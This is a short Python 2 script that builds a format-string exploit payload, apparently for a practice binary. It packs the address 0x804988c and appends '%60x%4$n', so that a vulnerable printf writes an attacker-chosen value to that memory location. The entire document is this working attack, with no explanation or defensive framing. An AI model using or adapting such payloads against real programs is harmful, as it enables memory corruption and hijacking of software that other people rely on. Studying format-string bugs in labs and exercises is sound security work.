import struct

address = struct.pack("<I", 0x804988c)
fstring = "%60x" + "%4$n"

print address + fstring
